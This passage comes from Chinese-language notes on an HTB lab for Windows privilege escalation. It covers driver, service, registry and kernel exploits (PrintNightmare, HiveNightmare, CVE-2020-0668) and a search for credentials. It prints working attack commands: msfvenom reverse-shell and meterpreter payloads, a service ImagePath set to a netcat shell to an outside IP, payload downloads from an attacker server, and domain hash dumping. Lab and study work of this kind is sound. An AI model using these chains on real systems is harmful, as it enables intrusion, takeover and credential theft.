<p>这将启动一个具有 SYSTEM 权限的 shell。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228081647.png" alt="Pasted image 20260228081647" />
<p><strong>替换方法 - 无图形用户界面</strong> 如果我们无法通过图形用户界面访问目标系统，则必须<code>ExploitCapcom.cpp</code>在编译前修改代码。在这里，我们可以编辑第 292 行，并将其替换为例如<code>"C:\\Windows\\system32\\cmd.exe"</code>使用 <code>reverse shell binary</code> 创建的反向 shell 二进制文件。<code>msfvenom</code><code>c:\ProgramData\revshell.exe</code></p>
<pre><code class="language-c">// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &amp;StartupInfo,
        &amp;ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}</code></pre>
<p>本例中的字符串<code>CommandLine</code>将更改为：</p>
<pre><code class="language-c"> TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");</code></pre>
<p><code>msfvenom</code>我们会根据生成的有效载荷设置一个监听器，希望在执行命令时能够收到反向 shell 连接<code>ExploitCapcom.exe</code>。如果反向 shell 连接由于某种原因被阻止，我们可以尝试绑定 shell 或执行/添加用户有效载荷。</p>
<p><strong>自动化步骤</strong> 使用EopLoadDriver实现自动化 我们可以使用EoPLoadDriver之类的工具来自动执行启用权限、创建注册表项以及加载驱动程序的过程<code>NTLoadDriver</code>。为此，我们可以运行以下命令：</p>
<pre><code class="language-cmd-session">C:\htb&gt; EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0</code></pre>
<p>然后我们会运行命令<code>ExploitCapcom.exe</code>来弹出 SYSTEM shell 或运行我们自定义的二进制文件。</p>
<p><strong>清理</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.</code></pre>
<h3>Server Operators 服务器操作员</h3>
<p>服务器运营者组允许成员无需分配域管理员权限即可管理 Windows 服务器。这是一个非常高权限的组，可以本地登录服务器，包括域控制器。 加入该组可获得强大的 <code>SeBackupPrivilege</code> 和 <code>SeRestorePrivilege</code> 权限，并能控制本地服务。</p>
<p>让我们来看看 <code>AppReadiness</code> 服务。我们可以确认，该服务是通过 <code>sc.exe</code> 工具作为 SYSTEM 启动的。</p>
<ol><li>查询 AppReadiness 服务</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem</code></pre>
<p>我们可以使用服务查看器/控制器 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" target="_blank" rel="noreferrer">PsService</a>，它是系统内部套件的一部分，来检查服务权限。<code>PsService</code> 的工作原理类似于 <code>sc</code> 工具，可以显示服务状态和配置，还允许你在本地和远程主机上启动、停止、暂停、恢复和重启服务。</p>
<ol><li>使用 PsService 检查服务权限</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All</code></pre>
<p>这证实了服务器运营商组拥有 <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights" target="_blank" rel="noreferrer">SERVICE_ALL_ACCESS</a> 访问权限，从而让我们对该服务拥有完全的控制权。</p>
<p>让我们看看本地管理员组当前的成员，确认我们的目标账户是否存在。</p>
<ol><li>检查本地管理员组成员</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.</code></pre>
<p>我们改二进制路径，执行一个命令，将当前用户添加到默认的本地管理员组。</p>
<ol><li>修改服务二进制路径</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS</code></pre>
<p>启动服务失败，这是意料之中的。</p>
<ol><li>服务启动</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.</code></pre>
<blockquote>必须触发一次“启动”，命令才会被执行。原因很简单：你改 <code>binPath</code> 只是改了配置，相当于把“下次启动时要运行的程序”改掉了。  <strong>但服务只有在启动那一刻才会读取 <code>binPath</code> 并创建进程。</strong></blockquote>
<p>如果我们检查管理员组的成员身份，会发现命令已成功执行。</p>
<ol><li>确认本地管理员组成员资格</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.</code></pre>
<p>从这里，我们可以完全控制域控制器，可以从 NTDS 数据库中检索所有凭证，访问其他系统，并执行后期的利用任务。</p>
<ol><li>确认域控制器的本地管理员访问权限</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ crackmapexec smb 10.129.29.67 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)</code></pre>
<ol><li>从域控制器获取 NTLM 密码哈希值</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-secretsdump server_adm@10.129.29.67 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...</code></pre>
<h2>攻击操作系统</h2>
<h3>用户账户控制 UAC</h3>
<ol><li><strong>UAC（用户账户控制）</strong>是 Windows 的一项安全机制，用来：</li></ol>
<p>关键特点：</p>
<p>但需要注意：</p>
<ul><li>在程序需要 <strong>管理员权限</strong> 时弹出确认提示</li><li>防止系统被 <strong>未经授权的程序修改</strong></li><li>默认情况下，程序都以 <strong>普通用户权限（Standard User）</strong> 运行</li><li>只有管理员 <strong>明确允许</strong> 时才会提升为管理员权限</li><li>主要目的是 <strong>减少误操作和恶意软件影响</strong></li></ul>
<blockquote>不是严格的安全边界（not a security boundary），只是一个防护层。</blockquote>
<blockquote>攻击者如果已经在系统里，仍然可能通过 <strong>UAC Bypass</strong> 提权。</blockquote>
<h3>弱权限配置</h3>
<p>系统的权限设置复杂且具有挑战性。一个地方的轻微修改可能会在其他地方出现缺陷。作为渗透测试人员，我们需要了解 Windows 中的权限工作原理，以及错误配置如何被利用来提升权限。本节讨论的权限相关缺陷在大型厂商发布的软件应用中相对较少见（但偶尔会出现），而在较小厂商的第三方软件、开源软件和定制应用中则很常见。服务通常以系统权限安装，因此利用服务权限相关的缺陷往往能实现对目标系统的完全控制。无论环境如何，我们都应始终检查权限薄弱，并且既能借助工具，也能手动作，以防工具不方便使用。</p>
<p><strong>这里介绍了四类提权</strong></p>
<ol><li>文件可写 -&gt; 替换服务exe</li><li>服务可控 -&gt; 改<code>binpath</code></li><li>路径未加引号 -&gt; 抢跑执行恶意exe</li><li>注册表可写 -&gt; 改<code>ImagePath</code>或自启动项</li></ol>
<p>****</p>
<ol><li>Permissive File System ACLs（可写服务文件）</li></ol>
<p><strong>概念</strong>: 如果某个 <strong>以 SYSTEM 权限运行的服务程序文件对普通用户可写</strong>，攻击者就可以替换该可执行文件，让系统在启动服务时执行恶意程序，从而获得高权限。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举存在弱 ACL 的服务文件</strong>: 自动扫描系统中 <strong>服务二进制文件权限配置错误</strong>。</p>
<pre><code>SharpUp.exe audit</code></pre>
<p><strong>② 检查文件 ACL</strong> ：  确认 <code>Users</code> 或 <code>Everyone</code> 是否拥有 <strong>写权限 / Full Control</strong>。</p>
<pre><code>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
<p><strong>③ 生成恶意程序</strong> 例如生成反弹 shell：</p>
<pre><code>msfvenom -p windows/shell_reverse_tcp -f exe &gt; SecurityService.exe</code></pre>
<p><strong>④ 替换服务二进制文件</strong></p>
<pre><code>copy SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
<p><strong>⑤ 启动服务</strong></p>
<pre><code>sc start SecurityService</code></pre>
<p>作用： 服务以 <strong>SYSTEM 权限</strong>运行，从而执行恶意程序并获取高权限。</p>
<hr />
<ol><li>Weak Service Permissions（弱服务权限）</li></ol>
<p><strong>概念</strong>: 如果普通用户对某个 Windows 服务拥有 <strong>SERVICE_ALL_ACCESS 权限</strong>，攻击者就可以修改服务配置（例如 <code>binpath</code>），让服务在启动时执行攻击者指定的命令，从而获得管理员权限。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举可修改的服务</strong>: 自动扫描系统中 <strong>权限配置错误的服务对象</strong>。</p>
<pre><code>SharpUp.exe audit</code></pre>
<p><strong>② 检查服务权限</strong>：确认当前用户是否拥有 <strong>SERVICE_ALL_ACCESS</strong>。</p>
<pre><code>accesschk.exe /accepteula -quvcw WindscribeService</code></pre>
<p><strong>③ 修改服务执行路径</strong>：将服务执行路径替换为恶意命令。</p>
<pre><code>sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"</code></pre>
<p><strong>④ 停止服务</strong>：确保服务重新启动时加载新的配置。</p>
<pre><code>sc stop WindscribeService</code></pre>
<p><strong>⑤ 启动服务</strong> ：  系统在尝试启动服务时会执行 <code>binpath</code> 中的命令，从而把当前用户加入 <strong>Administrators 组</strong>。</p>
<pre><code>sc start WindscribeService</code></pre>
<p>****</p>
<ol><li>Unquoted Service Path（未加引号的服务路径）</li></ol>
<p><strong>概念</strong>: 如果服务路径中包含空格但没有使用引号包裹，Windows 在解析路径时会尝试多个可能的执行路径，攻击者可以在这些路径中放置恶意程序，从而劫持服务执行。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举未加引号的服务路径</strong>: 查找自动启动且路径未被引号包裹的服务。</p>
<pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>
<p><strong>② 查看服务配置</strong>：确认服务路径以及运行权限。</p>
<pre><code class="language-cmd">sc qc SystemExplorerHelpService</code></pre>
<p><strong>③ 在可利用路径放置恶意程序</strong>：例如创建恶意程序：</p>
<pre><code class="language-cmd">C:\Program.exe</code></pre>
<p><strong>④ 等待服务启动</strong>：可以通过服务重启或系统重启触发。</p>
<p>作用： Windows 会优先执行攻击者放置的恶意程序，从而以 <strong>SYSTEM 权限执行代码</strong>。</p>
<hr />
<ol><li>Permissive Registry ACLs（可写服务注册表）</li></ol>
<p><strong>概念</strong>: 如果普通用户对服务相关的 <strong>注册表键拥有写权限</strong>，攻击者可以修改服务的 <code>ImagePath</code>，让服务在启动时执行恶意程序。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举服务注册表权限</strong>：查找拥有写权限的服务注册表项。</p>
<p>accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services</p>
<p><strong>② 修改服务执行路径</strong>：将 <code>ImagePath</code> 修改为攻击者控制的程序。</p>
<pre><code class="language-powershell">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</code></pre>
<p><strong>③ 启动服务</strong></p>
<pre><code class="language-cmd">sc start ModelManagerService</code></pre>
<p>作用： 服务启动时会执行新的 <code>ImagePath</code>，从而以 <strong>SYSTEM 权限运行攻击代码</strong>。</p>
<hr />
<ol><li>Modifiable Registry Autorun Binary（可修改启动项程序）</li></ol>
<p><strong>概念</strong>: Windows 在系统启动或用户登录时会自动执行某些程序，如果攻击者可以修改这些启动项对应的程序或路径，就可以在用户登录时执行恶意代码实现提权。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举系统启动项</strong>: 查看系统和用户登录时自动运行的程序。</p>
<pre><code class="language-powershell">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</code></pre>
<p><strong>② 检查启动程序权限</strong>：确认是否可以修改或替换该程序。</p>
<pre><code>icacls &lt;startup program path&gt;</code></pre>
<p>③ 替换启动程序：用攻击者控制的程序替换原文件。</p>
<p>④ 等待用户登录或系统启动</p>
<p>作用： 当对应用户登录或系统启动时，Windows 会自动执行恶意程序，从而获得更高权限。</p>
<h2>内核漏洞利用</h2>
<p>在这台 <strong>HTB Windows 提权实验机</strong> 上，按本节的 <strong>3 个示例</strong> 各跑一遍，把权限提到 <strong><code>NT AUTHORITY\SYSTEM</code></strong>，最后读取 <strong>Administrator Desktop</strong> 上的 flag。</p>
<p>这 3 个示例分别是：</p>
<ol><li><strong>HiveNightmare / SeriousSam</strong></li></ol>
<ul><li>低权限用户读取shadow副本里的 <code>SAM / SYSTEM / SECURITY</code></li><li>离线提取本地账户哈希</li><li>再利用哈希拿高权限</li></ul>
<ol><li><strong>PrintNightmare</strong></li></ol>
<ul><li>利用打印后台处理服务漏洞</li><li>直接添加一个本地管理员用户，或者执行恶意 DLL</li><li>再切到高权限上下文</li></ul>
<ol><li><strong>CVE-2020-0668 + Mozilla Maintenance Service</strong></li></ol>
<ul><li>利用任意文件移动漏洞，把你可控的恶意程序放进 SYSTEM 服务路径</li><li>启动服务拿 SYSTEM shell</li></ul>
<h3>一、PrintNightmare</h3>
<h4>先检查 Spooler 打印后台服务是否开启</h4>
<p>在目标机 PowerShell：</p>
<pre><code>ls \\localhost\pipe\spoolss</code></pre>
<p>如果看到 <code>spoolss</code>，说明打印服务在跑，可以继续。</p>
<hr />
<h4>绕过执行策略</h4>
<pre><code class="language-powershell">Set-ExecutionPolicy Bypass -Scope Process</code></pre>
<p>输入 <code>A</code> 确认。</p>
<hr />
<h4>导入脚本并添加管理员用户</h4>
<p>假设题目环境里已经给了 <code>CVE-2021-1675.ps1</code>，执行：</p>
<pre><code class="language-powershell">Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</code></pre>
<p>成功时一般会看到类似：</p>
<ul><li>created payload</li></ul>
<ul><li>added user hacker as local administrator</li></ul>
<hr />
<h4>验证新用户</h4>
<pre><code class="language-cmd">net user hacker</code></pre>
<p>或者：</p>
<pre><code class="language-cmd">net localgroup administrators</code></pre>
<hr />
<h4>使用新用户获取管理员 Shell</h4>
<p>如果 RDP 允许，直接重新登录：</p>
<ul><li>用户：<code>hacker</code></li></ul>
<ul><li>密码：<code>Pwnd1234!</code></li></ul>
<p>或者在当前会话里尝试：</p>
<pre><code class="language-cmd">runas /user:hacker cmd</code></pre>
<p>然后输入密码。</p>
<hr />
<h4>再提升到高完整性 Shell</h4>
<p>如果只是管理员组但还是中完整性，执行：</p>
<pre><code class="language-powershell">Start-Process cmd -Verb RunAs</code></pre>
<p>弹 UAC 就点是。</p>
<hr />
<h4>读取 flag</h4>
<pre><code class="language-cmd">type C:\Users\Administrator\Desktop\flag.txt</code></pre>
<p>如果文件名不是这个，先：</p>
<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
<hr />
<h3>二、HiveNightmare / SeriousSam</h3>
<p>这个示例的本质是： <strong>低权限读取注册表影子副本 -&gt; 导出 hive -&gt; 离线提 hash</strong>。</p>
<hr />
<h4>检查 SAM 文件权限</h4>
<pre><code class="language-cmd">icacls C:\Windows\System32\config\SAM</code></pre>
<p>你要看有没有类似：</p>
<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
<p>如果有，说明有戏。</p>
<hr />
<h4>运行 HiveNightmare</h4>
<p>假设工具已经在桌面或工具目录：</p>
<pre><code class="language-cmd">.\HiveNightmare.exe</code></pre>
<p>正常会吐出：</p>
<ul><li><code>SAM-xxxx-xx-xx</code></li></ul>
<ul><li><code>SYSTEM-xxxx-xx-xx</code></li></ul>
<ul><li><code>SECURITY-xxxx-xx-xx</code></li></ul>
<hr />
<h4>把文件传回攻击机</h4>
<p>在攻击机开 HTTP 或 SMB 收，或者直接 RDP 拖出来。 如果你在 Kali 上，用 impacket 解析：</p>
<pre><code class="language-shell">impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local</code></pre>
<hr />
<h4>拿到哈希后怎么用</h4>
<p>如果看到管理员或其他高权限账户哈希，可以尝试：</p>
<ul><li>本地 PTH（某些场景）</li></ul>
<ul><li>SMB / WinRM / PsExec</li></ul>
<ul><li>或者用明文密码复用</li></ul>
<p>但这一步在这题里不一定是最顺的路线。 所以这部分你更该把它当作：</p>
<p><strong>“验证这个漏洞能被利用”</strong>。</p>
<p>如果题目硬要求 “try out 3 examples”，你跑通导出 hive 并拿到 hash，基本就算完成这个示例了。</p>
<hr />
<h3>三、CVE-2020-0668 与 Mozilla Maintenance Service 提权链</h3>
<p>这个是本节里最像“标准 SYSTEM 提权”的链子。</p>
<h4>先确认当前权限不高</h4>
<pre><code class="language-cmd">whoami /priv</code></pre>
<p>一般会看到你只是普通用户权限。</p>
<hr />
<h4>检查 Mozilla Maintenance Service 二进制文件权限</h4>
<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<p>正常一开始你应该只有：</p>
<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
<p>也就是只能读执行，不能写。</p>
<hr />
<h4>在攻击机生成恶意 EXE</h4>
<p>如果你用 msfvenom：</p>
<pre><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;你的VPN_IP&gt; LPORT=8443 -f exe &gt; maintenanceservice.exe</code></pre>
<hr />
<h4>在攻击机开启 HTTP 服务</h4>
<pre><code class="language-shell">python3 -m http.server 8080</code></pre>
<hr />
<h4>在目标机下载两份恶意 EXE</h4>
<p>PowerShell：</p>
<pre><code class="language-powershell">wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe
wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe</code></pre>
<p>为什么两份？ 因为第一份在漏洞利用过程中会被“搞坏”，第二份是备用的干净版本。</p>
<hr />
<h4>运行 CVE-2020-0668</h4>
<p>假设 exploit 在 <code>C:\Tools\CVE-2020-0668\</code>：</p>
<pre><code class="language-cmd">C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<p>如果输出里有：</p>
<ul><li><code>Moving ...</code></li></ul>
<ul><li><code>Creating symbol links</code></li></ul>
<ul><li><code>Updating ... Tracing ...</code></li></ul>
<ul><li><code>Done!</code></li></ul>
<p>说明大体跑通了。</p>
<hr />
<h4>再检查目标文件权限</h4>
<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<p>这时你应该看到自己用户对它有：</p>
<pre><code>(F)</code></pre>
<p>也就是 Full Control。</p>
<hr />
<h4>用第二份干净恶意 EXE 覆盖目标服务文件</h4>
<p>注意这步要在 <strong>cmd.exe</strong> 里执行，不是 PowerShell。</p>
<pre><code class="language-cmd">copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<hr />
<h4>在攻击机启动 Metasploit handler</h4>
<p>先写一个 <code>handler.rc</code>：</p>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST &lt;你的VPN_IP&gt;
set LPORT 8443
exploit</code></pre>
<p>启动：</p>
<pre><code class="language-shell">sudo msfconsole -r handler.rc</code></pre>
<hr />
<h4>启动 Mozilla Maintenance 服务</h4>
<p>目标机执行：</p>
<pre><code class="language-cmd">net start MozillaMaintenance</code></pre>
<p>即使报错：</p>
<pre><code>The service is not responding to the control function</code></pre>
<p>也别慌，这种错误在这类题里经常只是“服务没正常起来，但 payload 已经执行了”。</p>
<hr />
<h4>在 msfconsole 中获取 SYSTEM 会话</h4>
<p>成功后通常会弹回：</p>
<pre><code>Meterpreter session opened ...</code></pre>
<p>进去确认：</p>
<pre><code>getuid</code></pre>
<p>你想看到的是：</p>
<pre><code>NT AUTHORITY\SYSTEM</code></pre>
<hr />
<h4>最后读取 flag</h4>
<p>如果你在 meterpreter 里：</p>
<pre><code>shell
type C:\Users\Administrator\Desktop\flag.txt</code></pre>
<p>如果文件名不对：</p>
<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
<h2>凭据窃取</h2>
<h3>搜索</h3>
<p>违背最佳实践，应用程序通常将密码存储在明文配置文件中。假设我们在一个无权限用户账户的上下文中获得命令执行。在这种情况下，我们可能能找到他们管理员账户或其他特权本地或域账户的凭证。我们可以使用 <a href="https://ss64.com/nt/findstr.html" target="_blank" rel="noreferrer">findstr</a> 工具来搜索这些敏感信息。</p>
<ol><li><strong>应用配置文件</strong></li></ol>
<pre><code>PS C:\htb&gt; findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml</code></pre>
<p>敏感的 IIS 信息，如凭证，可能会存储在 <code>web.config</code> 文件中。对于默认的 IIS 网站，这个地址可能在 <code>C：\inetpub\wwwroot\web.config</code>，但该文件可能在不同位置有多个版本，我们可以递归地搜索。</p>
<ol><li><strong>词典文件</strong></li></ol>
<p>另一个有趣的例子是词典文件。例如，密码等敏感信息可能会在电子邮件客户端或基于浏览器的应用中输入，这些应用会在不识别的单词下划线。用户可以将这些词汇添加到词典中，以避免红色下划线分散注意力。</p>
<pre><code class="language-powershell">PS C:\htb&gt; gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password 

Password1234!</code></pre>
<p>可能定义了自动登录设置或安装过程中需要创建的额外账户。<code>unattend.xml</code> 中的密码以明文或 base64 编码存储。</p>
<ol><li><strong>Unattended 安装文件</strong></li></ol>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;unattend xmlns="urn:schemas-microsoft-com:unattend"&gt;
    &lt;settings pass="specialize"&gt;
        &lt;component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
            &lt;AutoLogon&gt;
                &lt;Password&gt;
                    &lt;Value&gt;local_4dmin_p@ss&lt;/Value&gt;
                    &lt;PlainText&gt;true&lt;/PlainText&gt;
                &lt;/Password&gt;
                &lt;Enabled&gt;true&lt;/Enabled&gt;
                &lt;LogonCount&gt;2&lt;/LogonCount&gt;
                &lt;Username&gt;Administrator&lt;/Username&gt;
            &lt;/AutoLogon&gt;
            &lt;ComputerName&gt;*&lt;/ComputerName&gt;
        &lt;/component&gt;
    &lt;/settings&gt;</code></pre>
<p>虽然这些文件应作为安装的一部分自动删除，但系统管理员在制作映像和答复文件时，可能在其他文件夹中创建了该文件的副本。</p>
<p>从 Windows 10 的 Powershell 5.0 开始，PowerShell 将命令历史记录存储在以下文件中：</p>
<ol><li><strong>Powershell 历史文件</strong></li></ol>
<ul><li><code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>.</li></ul>
<p>正如 Microsoft 发布的（handy）Windows Commands PDF 中所见，有许多命令可以在命令行传递凭证。在下面的示例中可以看到，用户指定本地管理凭证用 <a href="https://ss64.com/nt/wevtutil.html" target="_blank" rel="noreferrer">wevutil</a> 查询应用事件日志。</p>
<ul><li>确认 PowerShell 历史保存路径</li></ul>
<pre><code>PS C:\htb&gt; (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre>
<p>一旦知道了文件的位置（默认路径在上面），我们就可以尝试用 <code>gc</code> 读取其内容。</p>
<ul><li>阅读 PowerShell 历史文件</li></ul>
<pre><code class="language-powershell">PS C:\htb&gt; gc (Get-PSReadLineOption).HistorySavePath 
dir 
cd Temp 
md backups 
cp c:\inetpub\wwwroot\* .\backups\ 
Set-ExecutionPolicy Bypass -Scope Process -Force; 
[System.Net.ServicePointManager]::SecurityProtocol = 
[System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1')) 
. .\Get-IISsite.ps1 Get-IISsite -Server WEB02 -web "Default Web Site" 
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true 
/u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
<p>我们还可以用这句一句话来检索当前用户能访问的所有 Powershell 历史文件的内容。这在exploit后也非常有帮助。如果我们之前的访问权限无法读取某些用户的文件，我们应该在获得本地管理员后重新检查这些文件。该命令假设使用的是默认的存档路径。</p>
<pre><code>PS C:\htb&gt;foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force;
[System.Net.ServicePointManager]::SecurityProtocol = 
[System.Net.ServicePointManager]::SecurityProtocol -bor 3072;
iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/IISSite.ps1'))

.\Get-IISSite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"

wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
<p>凭据常被用于脚本编写和自动化任务，方便地存储加密凭据。凭据通过 <a href="https://en.wikipedia.org/wiki/Data_Protection_API" target="_blank" rel="noreferrer">DPAPI</a> 保护，通常意味着只有同一用户在创建它们的同一计算机上才能解密。</p>
<ol><li><strong>Powershell 凭证</strong></li></ol>
<p>举个例子，以下脚本 <code>Connect-VC.ps1</code>，一位系统管理员创建它，方便连接到 vCenter 服务器。</p>
<pre><code># Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword</code></pre>
<p>解密 PowerShell 凭据 如果我们在该用户的背景中获得了命令执行权，或者能滥用 DPAPI，那么我们可以从 <code>encrypted.xml</code> 恢复明文凭据。下面的例子假设是前者。</p>
<pre><code>PS C:\htb&gt; $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb&gt; $credential.GetNetworkCredential().username

bob


PS C:\htb&gt; $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!</code></pre>
<h3>其他文件</h3>
